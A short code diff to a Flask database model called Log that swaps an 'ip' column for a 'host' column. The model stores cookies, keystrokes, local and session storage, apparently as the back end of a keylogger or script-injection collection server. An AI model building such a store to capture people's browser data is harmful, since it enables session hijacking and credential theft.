@@ -7,8 +7,8 @@ class Log(db.Model):
     
     cookies = db.Column(db.Text, unique=False, nullable=True)
     created_at = db.Column(db.DateTime, server_default=db.func.now())
+    host = db.Column(db.Text, unique=False, nullable=False)
     id = db.Column(db.Integer, primary_key=True)
-    ip = db.Column(db.String(50), unique=False, nullable=False)
     keystrokes = db.Column(db.Text, unique=False, nullable=False)
     local_storage = db.Column(db.Text, unique=False, nullable=True)
     session_storage = db.Column(db.Text, unique=False, nullable=True)
@@ -22,8 +22,8 @@ class Log(db.Model):
         return {
             "cookies": self.cookies,
             "created_at": self.created_at,
+            "host": self.host,
             "id": self.id,
-            "ip": self.ip,
             "keystrokes": self.keystrokes,
             "local_storage": self.local_storage,
             "session_storage": self.session_storage,
